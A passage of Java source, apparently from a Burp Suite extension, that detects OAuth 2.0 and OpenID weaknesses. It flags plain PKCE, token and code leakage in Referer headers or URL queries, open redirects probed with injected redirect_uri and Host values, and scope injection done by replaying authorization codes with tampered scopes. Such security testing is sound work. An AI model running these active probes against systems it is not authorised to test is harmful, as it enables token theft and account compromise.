                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                            "[Info] OAUTHv2 Authorization Code Flow with PKCE Protection",
                                            "The Authorization Code Flow login request has the <code>code_challenge</code> parameter, "
                                                    +"then there is a PKCE protection against authorization code interception.\n<br>"
                                                    +"The OAUTHv2 Authorization Code Flow with PKCE provides protection against authorization code interception attacks\n"
                                                    +"In Mobile, Native desktop and SPA contexts (public clients) the use of OAUTHv2 Authorization Code Flow with PKCE extension is a security requirement.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://datatracker.ietf.org/doc/html/rfc7636\">https://datatracker.ietf.org/doc/html/rfc7636</a>",
                                            "Information",
                                            "Firm"
                                    )
                            );
                            // Checking for OAUTHv2 Authorization Code Flow PKCE misconfiguration
                            //} //else if ((reqQueryParam.containsKey("code_challenge_method")) || (challengemethodParameter != null)) {
                            if ("plain".equalsIgnoreCase(challengemethodParameter.getValue())) {
                                List<int[]> matches = getMatches(requestString.getBytes(), "plain".getBytes());
                                issues.add(
                                        new CustomScanIssue(
                                                baseRequestResponse.getHttpService(),
                                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, matches, null) },
                                                "[Flaw 5] OAUTHv2 Authorization Code Flow with PKCE Plaintext",
                                                "The Authorization Code Flow with PKCE is configured with the <code>code_challenge_method</code> parameter set to <b>plain</b>.\n<br>"
                                                        +"This means that the secret <code>code_verifier</code> value is sent plaintext on requests "
                                                        +"then PKCE protections against authorization code interception attacks are de-facto disabled. In fact "
                                                        +"they are based on the secrecy of the <code>code_verifier</code> parameter sent within requests.\n<br>"
                                                        +"In Mobile, Native desktop and SPA contexts (public clients) the use of OAUTHv2 Authorization Code Flow with PKCE extension is a security requirement.\n<br>"
                                                        +"<br>References:<br>"
                                                        +"<a href=\"https://datatracker.ietf.org/doc/html/rfc7636\">https://datatracker.ietf.org/doc/html/rfc7636</a>",
                                                "Medium",
                                                "Firm"
                                        )
                                );
                            }
                        }
                    }

                    // Then search for other OAUTHv2 flows (i.e. Resource Owner Password Credentials, or Client Credentials Flows)
                } else if (reqParam!=null & grantParameter != null) {
                    stdout.println("[+] Passive Scan: OAUTHv2 Resource Owner Password Credentials or Client Credentials Flows detected");
                    // First retrieves the grant_type parameter from request body
                    String grantType = "";
                    for (IParameter param: reqParam) {
                        if (param.getType() == IParameter.PARAM_BODY) {
                            if (param.getName().equals("grant_type")) {
                                grantType = param.getValue();
                            }
                        }
                    }

                    // Checking for OAUTHv2 Resource Owner Password Credentials Flow
                    if (grantType.equals("password")) {
                        // Found OAUTHv2 Resource Owner Password Credentials Flow
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                        "[Info] OAUTHv2 Resource Owner Password Credentials Flow Detected",
                                        "This is a Resource Owner Password Credentials Flow login request, the <code>grant_type</code> value is <b>"+helpers.urlDecode(grantType)+"</b>.\n<br>"
                                                +"this OAUTHv2 schema is deprecated by the standatd security recommendations. "
                                                +"Especially in Mobile, Native desktop and SPA application (public clients) contexts the Resource Owner Password Credentials Flow should be avoided."
                                                +"It is possible to use it on legacy web applications only for migration reasons when both Client Application and Authorization Server "
                                                +"belong to the same provider.",
                                        "Information",
                                        "Certain"
                                )
                        );

                        // Checking OAUTHv2 Client Credentials Flow
                    } else if (grantType.equals("client_credentials")) {
                        // Checking if Refresh token is released in login response (Location header or body) that is discouraged for Client Credentials Flow
                        foundRefresh = false;
                        if (!respBody.isEmpty() && respBody.toLowerCase().contains("refresh")) {
                            foundRefresh = true;
                        } else if (getHttpHeaderValueFromList(respHeaders, "Location")!=null) {
                            if (getHttpHeaderValueFromList(respHeaders, "Location").toLowerCase().contains("refresh")) {
                                foundRefresh = true;
                            }
                        }
                        if (foundRefresh) {
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                            "OAUTHv2 Client Credentials Flow Improper Release of Refresh Token",
                                            "The Resource Server seems releasing a refresh token (in Location header or response body) after a successful "
                                                    +"Client Credentials Flow login, this practice is discouraged by OAUTHv2 specifications.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://datatracker.ietf.org/doc/html/rfc6749#section-4.4.3\">https://datatracker.ietf.org/doc/html/rfc6749#section-4.4.3</a>",
                                            "Low",
                                            "Tentative"
                                    )
                            );
                        } else {
                            // Found OAUTHv2 Client Credentials Flow
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                            "[Info] OAUTHv2 Client Credentials Flow Detected",
                                            "This is a Client Credentials Flow login request, the <code>grant_type</code> value is <b>"+helpers.urlDecode(grantType)+"</b>.\n<br>"
                                                    +"Normally this OAUTHv2 Flow is used by clients to obtain an access token outside of the context of a user (i.e. Machine-to-Machine).",
                                            "Information",
                                            "Certain"
                                    )
                            );
                        }
                        // Checking for OAUTHv2 Token Exchange Flow
                    } else if (helpers.urlDecode(grantType).equals("urn:ietf:params:oauth:grant-type:token-exchange")) {
                        // Found OAUTHv2 Token Exchange Flow
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                        "[Info] OAUTHv2 Token Exchange Flow Detected",
                                        "This is a Token Exchange Flow (RFC 8693) login request, the <code>grant_type</code> value is <b>"+helpers.urlDecode(grantType)+"</b>.\n<br>"
                                                +"Note: the Token Exchange specification does not require client authentication and even client identification at the token endpoint, "
                                                +"in that cases it should be implemented only on closed network within a service.",
                                        "Information",
                                        "Certain"
                                )
                        );
                        // Checking for OAUTHv2 JWT Bearer Flow
                    } else if (helpers.urlDecode(grantType).equals("urn:ietf:params:oauth:grant-type:jwt-bearer")) {
                        // Found OAUTHv2 JWT Bearer Flow
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                        "[Info] OAUTHv2 JWT Bearer Flow Detected",
                                        "This is a JWT Bearer Flow (RFC 7523) login request, the <code>grant_type</code> value is <b>"+helpers.urlDecode(grantType)+"</b>.\n<br>",
                                        "Information",
                                        "Certain"
                                )
                        );
                    }
                }
            }
        }

        // Additional passive checks on all request for Secret Token Leakage issues
        int[] findingOffset = new int[2];
        if (! GOTTOKENS.isEmpty()) {
            String reqReferer = getHttpHeaderValueFromList(reqHeaders, "Referer");
            for (Map.Entry<String,List<String>> entry : GOTTOKENS.entrySet()) {
                List<String> tokenList = entry.getValue();
                for (String tokenValue: tokenList) {
                    if (reqReferer!=null) {
                        if (reqReferer.contains(tokenValue)) {
                            // Found Secret Token Leakage issue on Referer header
                            List<int[]> requestHighlights = new ArrayList<>(1);
                            int findingStart = requestString.indexOf(reqReferer);
                            findingOffset[0] = findingStart;
                            findingOffset[1] = findingStart+reqReferer.length();
                            requestHighlights.add(findingOffset);
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, requestHighlights, null) },
                                            "OAUTHv2/OpenID Leakage of Secret Token on Referer Header",
                                            "The request improperly exposes the following secret token (Access Token or Refresh Token) "
                                                    +"on its Referer header: <b>"+tokenValue+"</b>, then a threat agent could be able retrieve it and "
                                                    +"obtain access to private resources of victim users.",
                                            "Medium",
                                            "Firm"
                                    )
                            );
                        }
                    }
                    if (!reqQueryString.isEmpty() & reqQueryString.contains(tokenValue)) {
                        // Found Secret Token Leakage issue in URL query
                        List<int[]> requestHighlights = new ArrayList<>(1);
                        int findingStart = requestString.indexOf(tokenValue);
                        findingOffset[0] = findingStart;
                        findingOffset[1] = findingStart+tokenValue.length();
                        requestHighlights.add(findingOffset);
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, requestHighlights, null) },
                                        "OAUTHv2/OpenID Leakage of Secret Token in URL Query",
                                        "The request improperly exposes the following secret token (Access Token or Refresh Token) "
                                                +"value on its URL query string: <b>"+tokenValue+"</b>, then a threat agent could be able retrieve it and "
                                                +"obtain access to private resources of victim users.",
                                        "Medium",
                                        "Firm"
                                )
                        );
                    }
                }
            }
        }
        // Additional checks on all requests for OpenID Id_Token Leakage issues
        if (! GOTOPENIDTOKENS.isEmpty()) {
            String reqReferer = getHttpHeaderValueFromList(reqHeaders, "Referer");
            List<String> idtokenList = GOTOPENIDTOKENS;
            for (String idtokenValue: idtokenList) {
                if (reqReferer!=null) {
                    if (reqReferer.contains(idtokenValue)) {
                        // Found ID_Token Leakage issue on Referer header
                        List<int[]> requestHighlights = new ArrayList<>(1);
                        int findingStart = requestString.indexOf(reqReferer);
                        findingOffset[0] = findingStart;
                        findingOffset[1] = findingStart+reqReferer.length();
                        requestHighlights.add(findingOffset);
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, requestHighlights, null) },
                                        "OpenID Leakage of ID_Token on Referer Header",
                                        "The request improperly exposes the following OpenID <code>id_token</code> "
                                                +"on its Referer header: <b>"+idtokenValue+"</b>, then a threat agent could be able retrieve it and "
                                                +"potentially retrieve reserved data contained in its claims (eg. users PII).",
                                        "Medium",
                                        "Firm"
                                )
                        );
                    }
                }
                if (!reqQueryString.isEmpty() & reqQueryString.contains(idtokenValue)) {
                    // Found ID_Token Leakage issue in URL query
                    List<int[]> requestHighlights = new ArrayList<>(1);
                    int findingStart = requestString.indexOf(idtokenValue);
                    findingOffset[0] = findingStart;
                    findingOffset[1] = findingStart+idtokenValue.length();
                    requestHighlights.add(findingOffset);
                    issues.add(
                            new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                    new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, requestHighlights, null) },
                                    "OpenID Leakage of ID_Token in URL Query",
                                    "The request improperly exposes the following OpenID <code>id_token</code> "
                                            +"value on its URL query string: <b>"+idtokenValue+"</b>, then a threat agent could be able retrieve it and "
                                            +"potentially retrieve reserved data contained in its claims (eg. users PII).",
                                    "Medium",
                                    "Firm"
                            )
                    );
                }
            }
        }
        // Additional checks on all requests for Authorization Code Leakage issues
        if (!GOTCODES.isEmpty()) {
            String reqReferer = getHttpHeaderValueFromList(reqHeaders, "Referer");
            for (Map.Entry<String,List<String>> entry : GOTCODES.entrySet()) {
                List<String> codeList = entry.getValue();
                for (String codeValue: codeList) {
                    if (reqReferer!=null) {
                        if (reqReferer.contains(codeValue)) {
                            // Found Authorization Code Leakage issue on Referer header
                            List<int[]> requestHighlights = new ArrayList<>(1);
                            int findingStart = requestString.indexOf(reqReferer);
                            findingOffset[0] = findingStart;
                            findingOffset[1] = findingStart+reqReferer.length();
                            requestHighlights.add(findingOffset);
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, requestHighlights, null) },
                                            "OAUTHv2/OpenID Leakage of Authorization Code on Referer Header",
                                            "The request improperly exposes the following OAUTHv2/OpenID authorization code "
                                                    +"on its Referer header: <b>"+codeValue+"</b>, then a threat agent could be able retrieve it and "
                                                    +"potentially gain access to private resources of victim users.",
                                            "Medium",
                                            "Firm"
                                    )
                            );
                        }
                    }
                }
            }
        }
        //新增mcp代码的部分
        //issues.addAll(mcpPassiveScan(baseRequestResponse));
        return issues;
    }






    public List<IScanIssue> redirectScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
    // Scan for open redirect issues on 'redirect_uri' parameter using Implicit Trust Heuristic (Absence of Error)
        List<IScanIssue> issues = new ArrayList<>();
    // 【新增】：进行拓扑层级鉴定
        String layer = identifyLayer(baseRequestResponse);
        Boolean hostheaderCheck = false;
        IHttpRequestResponse checkRequestResponse = null;
        int[] payloadOffset = new int[2];
        String checkRequestStr = "";

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
        URL url = reqInfo.getUrl();
        String proto = url.getProtocol();
        String host = url.getHost();
        byte[] rawrequest = baseRequestResponse.getRequest();

        IParameter redirectUriParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "redirect_uri");
        IParameter scopeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "scope");
        IParameter clientIdParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "client_id");
        IParameter resptypeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "response_type");


    // Checking only OAUTHv2 and OpenID authorization-code requests
        if (clientIdParameter != null && resptypeParameter != null) {
            if (insertionPoint.getInsertionPointName().equals("response_type")) { // Forcing to perform only a tentative (unique insertion point)
                stdout.println("[+] Active Scan: Checking for Unvalidated Redirect on Authorization Code Flow");
    // Iterating for each redirect_uri payload
                for (String payload_redir : INJ_REDIR) {
                    String originalRedirUri = "";
    // Extracting the original 'redirect_uri' parameter
                    if (redirectUriParameter != null) {
                        originalRedirUri = redirectUriParameter.getValue();
                    } else {
                        originalRedirUri = proto + "://" + host;
                    }
                    hostheaderCheck = false;

    // Building some specific payloads
                    if (payload_redir.contains("../") || payload_redir.contains("..;/")) {
                        payload_redir = originalRedirUri + payload_redir;
                    } else if (payload_redir.contains("%2e%2e%2f")) {
                        payload_redir = originalRedirUri + payload_redir;
                    } else if (payload_redir.contains("#")) {
                        payload_redir = payload_redir + originalRedirUri;
                    } else if (payload_redir.contains(":password@")) {
                        payload_redir = originalRedirUri + payload_redir;
                    } else if (payload_redir.contains("&")) {
                        //payload_redir = originalRedirUri + payload_redir;
                        continue;
                    } else if (payload_redir.equals("HOST_HEADER")) {
                        hostheaderCheck = true;
                        String newHostname = "burpcollaborator.net";
                        payload_redir = newHostname + "/" + host;
                    } else if (payload_redir.startsWith(".") || payload_redir.startsWith("@")) {
                        payload_redir = originalRedirUri + payload_redir;
                    }
    // Build request containing the payload in the insertion point
                    if (hostheaderCheck) {
                        List<String> reqHeaders = reqInfo.getHeaders();
                        List<String> checkReqHeaders = new ArrayList<>(reqHeaders);
                        Boolean isHost = false;
                        String newHeader = "Host: " + payload_redir;
                        for (int i = 0; i < checkReqHeaders.size(); i++) {
                            if (checkReqHeaders.get(i).startsWith("Host: ")) {
                                isHost = true;
                                checkReqHeaders.set(i, newHeader);
                            }
                        }
                        if (!isHost) {
                            checkReqHeaders.add(newHeader);
                        }
                        String reqBodyStr = new String(Arrays.copyOfRange(rawrequest, reqInfo.getBodyOffset(), rawrequest.length));
                        byte[] checkRequest = helpers.buildHttpMessage(checkReqHeaders, reqBodyStr.getBytes());
                        checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                        checkRequestStr = helpers.bytesToString(checkRequest);
                    } else {
                        if (redirectUriParameter != null && redirectUriParameter.getType() == IParameter.PARAM_BODY) {
                            IParameter newParam = helpers.buildParameter("redirect_uri", payload_redir, IParameter.PARAM_BODY);
                            byte[] checkRequest = helpers.updateParameter(rawrequest, newParam);
                            checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                            checkRequestStr = helpers.bytesToString(checkRequest);
                        } else if (redirectUriParameter != null && redirectUriParameter.getType() == IParameter.PARAM_URL) {
                            IParameter newParam = helpers.buildParameter("redirect_uri", payload_redir, IParameter.PARAM_URL);
                            byte[] checkRequest = helpers.updateParameter(rawrequest, newParam);
                            checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                            checkRequestStr = helpers.bytesToString(checkRequest);
                        } else {
    // For some custom OAUTH/OpenID request without 'redirect_uri' parameter
                            if (reqInfo.getMethod().equals("POST")) {
                                IParameter newParam = helpers.buildParameter("redirect_uri", payload_redir, IParameter.PARAM_BODY);
                                byte[] checkRequest = helpers.addParameter(rawrequest, newParam);
                                checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                                checkRequestStr = helpers.bytesToString(checkRequest);
                            } else {
                                IParameter newParam = helpers.buildParameter("redirect_uri", payload_redir, IParameter.PARAM_URL);
                                byte[] checkRequest = helpers.addParameter(rawrequest, newParam);
                                checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                                checkRequestStr = helpers.bytesToString(checkRequest);
                            }
                        }
                    }

                    if (checkRequestResponse != null && checkRequestResponse.getResponse() != null) {
                        byte[] checkResponse = checkRequestResponse.getResponse();
                        short statusCode = helpers.analyzeResponse(checkResponse).getStatusCode();
                        String lowerResponseStr = helpers.bytesToString(checkResponse).toLowerCase();


                        // 1. 定义防御机制的“拦截特征” (4xx 状态码或响应体包含明显错误词汇)
                        boolean isBlocked = (statusCode >= 400 && statusCode < 500) ||
                                lowerResponseStr.contains("error") ||
                                lowerResponseStr.contains("invalid") ||
                                lowerResponseStr.contains("mismatch") ||
                                lowerResponseStr.contains("unauthorized") ||
                                lowerResponseStr.contains("bad request");

                        // 2. 如果没有被拦截，我们就认为它存在未校验风险！
                        if (!isBlocked) {
                            List<int[]> requestHighlights = new ArrayList<>(1);
                            int payloadStart = checkRequestStr.indexOf(payload_redir);
                            if (payloadStart != -1) {
                                payloadOffset[0] = payloadStart;
                                payloadOffset[1] = payloadStart + payload_redir.length();
                                requestHighlights.add(payloadOffset);
                            }

                        // 【新增】：基于层级动态生成报告标题和描述
                            boolean isL1 = "L1".equals(layer);
                            String issueTitle = isL1 ?
                                    "[Flaw 7.1] Layer 1 Unvalidated Redirect URI" :
                                    "[Flaw 7.2] Layer 2 Unvalidated Redirect URI";
                            String issueDesc = isL1 ?
                                    "发现<b>第一层网关 (MCP Server)</b> 授权端点可能缺乏重定向校验。<br><br>" :
                                    "发现<b>底层身份提供商 (Layer 2+)</b> 授权端点可能缺乏重定向校验。<br><br>";
                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                    new IHttpRequestResponse[] { callbacks.applyMarkers(checkRequestResponse, requestHighlights, null) },
                                    issueTitle,
                                    issueDesc + "我们在请求中注入了恶意/畸形的 redirect_uri Payload: <br><code>" + payload_redir + "</code><br><br>"
                                            + "<b>行为特征判定：</b><br>"
                                            + "服务器<b>没有返回 4xx 错误状态码，也没有在响应正文中提示 invalid/mismatch 等错误字样</b>。这表明系统可能接受了该非法输入，并继续推进了内部状态机。<br><br>"
                                            + "在 MCP 等嵌套架构中，这极易导致恶意载荷被无条件打包并传递，最终引发延迟的 Open Redirect 攻击。",
                                    "High",
                                    "Tentative"));
                            break; // 找到漏洞跳出循环
                        }
                    }
                }
            }
        }
        return issues;
    }


    /**

     OAuth2/OpenID Scope参数注入漏洞主动扫描
     功能概述：
     1.通过状态机(FSM)追踪OAuth流程，识别单层/嵌套架构
     2.重放授权请求获取有效code，注入恶意scope载荷
     3.两种token请求构造方式：
        优先使用FSM缓存的真实token请求快照（保留完整认证上下文）
        兜底方案：从授权端点启发式推断token端点（/authorize -> /token）
     4. 验证响应中是否返回token且无error，判定漏洞存在
     关键改进：

     1. 引入FSM状态感知，避免对L1嵌套架构误报
     2. 支持内层callback递归跳转，剥离外层code
     3. 使用Burp API直接替换参数，保留原始编码格式

     多层正则匹配code提取（响应体/头/link）
     */
    public List<IScanIssue> scopeScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) throws MalformedURLException, UnsupportedEncodingException {
        // Scan for improper input validation issues of 'scope' parameter in token requests
        List<IScanIssue> issues = new ArrayList<>();
        IHttpRequestResponse checkRequestResponse_code;
        IHttpRequestResponse checkRequestResponse_token = null;
        int[] payloadOffset = new int[2];
        String checkRequestStr_token = "";
        Boolean isOpenID = false;
        String checkOriginReq_code;

        IParameter scopeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "scope");
        IParameter resptypeParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "response_type");
        IParameter redirectUriParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "redirect_uri");
        IParameter clientIdParameter = helpers.getRequestParameter(baseRequestResponse.getRequest(), "client_id");

        if (clientIdParameter != null && resptypeParameter != null) {
            if (helpers.urlDecode(resptypeParameter.getValue()).contains("id_token") || helpers.urlDecode(resptypeParameter.getValue()).contains("code")) {
                if (insertionPoint.getInsertionPointName().equals("response_type")) {
                    stdout.println("[+] Active Scan: Checking for Input Validation Issues on Scope parameter in token requests");

                    // =========================================================================
                    // 1. 拓扑与状态预检 (Topology & State Pre-check)
                    // =========================================================================
                    String layer = identifyLayer(baseRequestResponse);
                    String anchor = flowEngine.extractStateAnchor(helpers, baseRequestResponse);
                    OAuthFlowContext flow = anchor != null ? flowEngine.activeFlowsByState.get(anchor) : null;
                    boolean isNestedArchitecture = (flow != null && flow.l2State != null);

                    // 【场景 2】：当前是 L1 且确认处于双层嵌套架构 -> 直接跳过，不报 Issue
                    if ("L1".equals(layer) && isNestedArchitecture) {
                        stdout.println("[-] Scope Scan Skipped: Detected L1 in Nested Architecture via FSM.");
                        return issues;
                    }

                    if (helpers.urlDecode(resptypeParameter.getValue()).contains("id_token") || helpers.urlDecode(resptypeParameter.getValue()).equals("code token")) {
                        isOpenID = true;
                    } else if (scopeParameter != null && scopeParameter.getValue().contains("openid")) {
                        isOpenID = true;
                    }

                    // =========================================================================
                    // 2. 开始迭代注入 Scope 载荷
                    // =========================================================================
                    for (String payload_scope : INJ_SCOPE) {

                        // a) 重放基础请求获取全新的 Code
                        byte[] checkRequest_code = baseRequestResponse.getRequest();
                        IRequestInfo checkReqInfo_code = helpers.analyzeRequest(baseRequestResponse);
                        checkRequestResponse_code = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest_code);

                        byte[] checkResponse_code = checkRequestResponse_code.getResponse();
                        IResponseInfo checkRespInfo_code = helpers.analyzeResponse(checkResponse_code);
                        String checkResponseStr_code = helpers.bytesToString(checkResponse_code);
                        List<String> checkRespHeaders_code = checkRespInfo_code.getHeaders();

                        // b) 提取初步的回调地址
                        String locationValue = "";
                        if (checkResponseStr_code.contains("location.href")) {
                            Pattern pattern = Pattern.compile("location\\.href[\\s=]*['\"]{1}(https?:\\/\\/(www\\.)?[-a-zA-Z0-9@:%._\\+~#\\=]{1,256}\\.[a-zA-Z0-9\\(\\)]{1,6}\b([-a-zA-Z0-9\\(\\)@:%_\\+.~#?&//\\=]*))");
                            Matcher matcher = pattern.matcher(checkResponseStr_code);
                            if (matcher.find()) { locationValue = matcher.group(1); }
                        } else if (checkResponseStr_code.contains("location.replace") || checkResponseStr_code.contains("location.assign")) {
                            Pattern pattern = Pattern.compile("location\\.(assign|replace)[\\('\"]+(https?:\\/\\/(www\\.)?[-a-zA-Z0-9@:%._\\+~#\\=]{1,256}\\.[a-zA-Z0-9\\(\\)]{1,6}\b([-a-zA-Z0-9\\(\\)@:%_\\+.~#?&//\\=]*))");
                            Matcher matcher = pattern.matcher(checkResponseStr_code);
                            if (matcher.find()) { locationValue = matcher.group(2); }
                        } else if (checkRespInfo_code.getStatusCode() >= 300 && checkRespInfo_code.getStatusCode() < 400 && getHttpHeaderValueFromList(checkRespHeaders_code, "Location") != null) {
                            locationValue = getHttpHeaderValueFromList(checkRespHeaders_code, "Location");
                        } else {
                            Pattern pattern = Pattern.compile("(?=href|url)[\\s=]*['\"]?(https?:\\/\\/(www\\.)?[-a-zA-Z0-9@:%._\\+~#\\=]{1,256}\\.[a-zA-Z0-9\\(\\)]{1,6}\b([-a-zA-Z0-9\\(\\)@:%_\\+.~#?&//\\=]*))");
                            Matcher matcher = pattern.matcher(checkResponseStr_code);
                            if (matcher.find()) { locationValue = matcher.group(2); }
                        }

                        boolean isConnectedAndGotCode = !locationValue.isEmpty() && (locationValue.contains("code=") || locationValue.contains("authCode=") || locationValue.contains("id_token="));
                        //有可能original和测试时候的输出不一致（agent.ai mcp server）
                        if (!isConnectedAndGotCode) {
                            stdout.println("[!] Warning: Replayed auth request did NOT return callback with code");
                            break;//如果第一个payload重放auth请求就得不到code，后续payload也不可能成功,直接退出
                        }

                        // =========================================================================
                        // 3. 嵌套架构特殊处理：向内层 Callback 访问，剥夺外层 Code
                        // =========================================================================
                        if (isConnectedAndGotCode && isNestedArchitecture) {
                            try {
                                if (!locationValue.contains("http")) {
                                    if (checkReqInfo_code.getUrl().getPort() == 80 || checkReqInfo_code.getUrl().getPort() == 443) {
                                        checkOriginReq_code = checkReqInfo_code.getUrl().getProtocol() + "://" + checkReqInfo_code.getUrl().getHost();
                                    } else {
                                        checkOriginReq_code = checkReqInfo_code.getUrl().getProtocol() + "://" + checkReqInfo_code.getUrl().getAuthority();
                                    }
                                    locationValue = checkOriginReq_code + locationValue;
                                }

                                java.net.URL innerCallbackUrl = new java.net.URL(locationValue);
                                byte[] innerCallbackReq = helpers.buildHttpRequest(innerCallbackUrl);
                                IHttpService innerCallbackService = helpers.buildHttpService(
                                        innerCallbackUrl.getHost(),
                                        innerCallbackUrl.getPort() == -1 ? innerCallbackUrl.getDefaultPort() : innerCallbackUrl.getPort(),
                                        innerCallbackUrl.getProtocol().equals("https")
                                );

                                IHttpRequestResponse innerCallbackResp = callbacks.makeHttpRequest(innerCallbackService, innerCallbackReq);
                                IResponseInfo innerRespInfo = helpers.analyzeResponse(innerCallbackResp.getResponse());

                                if (innerRespInfo.getStatusCode() >= 300 && innerRespInfo.getStatusCode() < 400) {
                                    String outerLocation = getHttpHeaderValueFromList(innerRespInfo.getHeaders(), "Location");
                                    if (outerLocation != null && (outerLocation.contains("code=") || outerLocation.contains("authCode="))) {
                                        locationValue = outerLocation;
                                        checkResponse_code = innerCallbackResp.getResponse();
                                        checkRespInfo_code = innerRespInfo;
                                        checkResponseStr_code = helpers.bytesToString(checkResponse_code);
                                        checkRespHeaders_code = innerRespInfo.getHeaders();
                                    } else {
                                        isConnectedAndGotCode = false;
                                    }
                                } else {
                                    isConnectedAndGotCode = false;
                                }
                            } catch (Exception e) {
                                isConnectedAndGotCode = false;
                            }
                        }

                        if (!isConnectedAndGotCode) {
                            // 无法衔接获取Code，跳过本次 Payload
                            continue;
                        }

                        // c) 从响应或最终 Location 中提取真实授权码
                        List<String> codeValues = new ArrayList<>();
                        String checkResponseBody_code = checkResponseStr_code.substring(checkRespInfo_code.getBodyOffset()).trim();
                        for (String pName : SECRETCODES) {
                            codeValues.addAll(getMatchingParams(pName, pName, checkResponseBody_code, getHttpHeaderValueFromList(checkRespHeaders_code, "Content-Type")));
                            codeValues.addAll(getMatchingParams(pName, pName, locationValue, "header"));
                            codeValues.addAll(getMatchingParams(pName, pName, checkResponseBody_code, "link"));
                        }

                        if (codeValues.isEmpty()) continue;
                        codeValues = new ArrayList<>(new HashSet<>(codeValues));

                        // 构造恶意的 Scope 字符串
                        String injected_scope = payload_scope;
                        if (scopeParameter != null) {
                            // OAuth 标准中 Scope 多值以空格分隔
                            injected_scope = scopeParameter.getValue() + " " + payload_scope;
                        } else if (isOpenID) {
                            injected_scope = "openid " + payload_scope;
                        }

                        // =========================================================================
                        // 4. 执行 Token 交换攻击
                        // =========================================================================
                        for (String codeVal : codeValues) {

                            // 【方案 1 优先】：如果状态机中已经捕获了该系统的合法 Token 请求
                            if (flow != null && flow.tokenReq != null) {
                                //stdout.println("[*] [Scope Scan] Using REAL Token Request from FSM for Payload Injection");

                                // 1. 拷贝物理快照 (保留了合法认证头与边界信息)
                                byte[] tamperedTokenReq = flow.tokenReq.getRequest();

                                // 2. 利用 Burp API 直接替换 Code 参数 (自动处理 URL 编码)
                                IParameter oldCodeParam = helpers.getRequestParameter(tamperedTokenReq, "code");
                                byte codeType = oldCodeParam != null ? oldCodeParam.getType() : IParameter.PARAM_BODY;
                                tamperedTokenReq = helpers.updateParameter(tamperedTokenReq, helpers.buildParameter("code", codeVal, codeType));

                                // 3. 利用 Burp API 替换 Scope 参数
                                IParameter oldScopeParam = helpers.getRequestParameter(tamperedTokenReq, "scope");
                                byte scopeType = oldScopeParam != null ? oldScopeParam.getType() : IParameter.PARAM_BODY;
                                tamperedTokenReq = helpers.updateParameter(tamperedTokenReq, helpers.buildParameter("scope", injected_scope, scopeType));

                                // (可选) 确保 redirect_uri 一致
                                if (redirectUriParameter != null) {
                                    IParameter oldRedirParam = helpers.getRequestParameter(tamperedTokenReq, "redirect_uri");
                                    byte redirType = oldRedirParam != null ? oldRedirParam.getType() : IParameter.PARAM_BODY;
                                    tamperedTokenReq = helpers.updateParameter(tamperedTokenReq, helpers.buildParameter("redirect_uri", redirectUriParameter.getValue(), redirType));
                                }

                                checkRequestStr_token = helpers.bytesToString(tamperedTokenReq);
                                checkRequestResponse_token = callbacks.makeHttpRequest(flow.tokenReq.getHttpService(), tamperedTokenReq);
                            }
